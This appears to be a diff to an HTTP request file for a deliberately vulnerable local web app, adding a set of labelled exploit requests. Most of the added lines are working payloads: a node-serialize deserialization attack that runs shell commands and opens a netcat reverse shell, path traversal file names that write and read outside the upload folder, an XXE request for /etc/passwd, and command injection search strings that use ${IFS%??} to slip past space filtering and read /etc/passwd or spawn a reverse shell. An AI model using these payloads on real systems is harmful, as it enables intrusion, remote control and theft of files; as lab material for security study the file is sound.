@@ -116,6 +116,12 @@ Content-Type: application/json
 ###
 GET /api/users
 Host: localhost:3001
+###
+GET /api/images
+Host: localhost:3001
+###
+GET /api/images?search=landscape
+Host: localhost:3001
 ### Exploit: XML External Entities
 POST /api/pages HTTP/1.1
 Host: localhost:3001
@@ -127,3 +133,59 @@ Content-Type: text/xml
   <block type="header">Here's the server's /etc/passwd</block>
   <block type="paragraph">&xxe;</block>
 </page>
+### Exploit: Unsafe deserialization (ls /)
+POST /api/pages HTTP/1.1
+Host: localhost:3001
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Deserialize THIS</block>
+    <!-- {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()"} -->
+    <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2xzIC8nLCBmdW5jdGlvbihlcnJvciwgc3Rkb3V0LCBzdGRlcnIpIHsgY29uc29sZS5sb2coc3Rkb3V0KSB9KTt9KCkifQ==</block>
+</page>
+### Exploit: Unsafe deserialization (reverse shell)
+# The attacker's machine must have netcat listening: nc -lvp 4242
+POST /api/pages HTTP/1.1
+Host: localhost:3001
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Deserialize THIS</block>
+    <!-- {"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('nc -e /bin/bash 127.0.0.1 4242')}()"} -->
+    <block type='image'>eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ25jIC1lIC9iaW4vYmFzaCAxMjcuMC4wLjEgNDI0MicpfSgpIn0=</block>
+</page>
+### Exploit: Path traversal
+POST /api/pages HTTP/1.1
+Host: localhost:3001
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Save this outside the boundaries</block  >
+    <!-- {"fileName":"../../../outside.jpg", "url": "https://t4.ftcdn.net/jpg/00/53/45/31/360_F_53453175_hVgYVz0WmvOXPd9CNzaUcwcibiGao3CL.jpg"} -->
+    <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uL291dHNpZGUuanBnIiwgInVybCI6ICJodHRwczovL3Q0LmZ0Y2RuLm5ldC9qcGcvMDAvNTMvNDUvMzEvMzYwX0ZfNTM0NTMxNzVfaFZnWVZ6MFdtdk9YUGQ5Q056YVVjd2NpYmlHYW8zQ0wuanBnIn0=</block>
+</page>
+### Exploit: Path traversal 2 (Image is considered valid but it's not shown in the frontend)
+POST /api/pages HTTP/1.1
+Host: localhost:3001
+Content-Type: text/xml
+
+<?xml version='1.0'?>
+<page title="Exploit" author='2' publicationDate=''>
+    <block type='header'>Show this image from outside the boundaries</block>
+    <!-- {"fileName":"../../../../../../Pictures/secret.jpg" } -->
+    <block type='image'>eyJmaWxlTmFtZSI6Ii4uLy4uLy4uLy4uLy4uL1BpY3R1cmVzL3NlY3JldC5qcGciIH0=</block>
+</page>
+### Exploit: OS command injection (cat /etc/passwd)
+# Search query: 'shownoresults";cat${IFS%??}/etc/passwd;echo${IFS%??}-n${IFS%??}"'
+# ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
+GET /api/images?search=shownoresults%22%3Bcat%24%7BIFS%25%3F%3F%7D/etc/passwd%3Becho%24%7BIFS%25%3F%3F%7D-n%24%7BIFS%25%3F%3F%7D%22 HTTP/1.1
+Host: localhost:3001
+### Exploit: OS command injection (reverse shell)
+# Search query: '";nc${IFS%??}-e${IFS%??}/bin/bash${IFS%??}127.0.0.1${IFS%??}4242;echo${IFS%??}"'
+# ${IFS%??} extracts a space from a variable common in all linux systems. This is because spaces are replaced by hyphens ('-') in the code.
+# The attacker's machine must have netcat listening: nc -lvp 4242
+GET /api/images?search=%22%3Bnc%24%7BIFS%25%3F%3F%7D-e%24%7BIFS%25%3F%3F%7D%2Fbin%2Fbash%24%7BIFS%25%3F%3F%7D127.0.0.1%24%7BIFS%25%3F%3F%7D4242%3Becho%24%7BIFS%25%3F%3F%7D%22 HTTP/1.1
+Host: localhost:3001
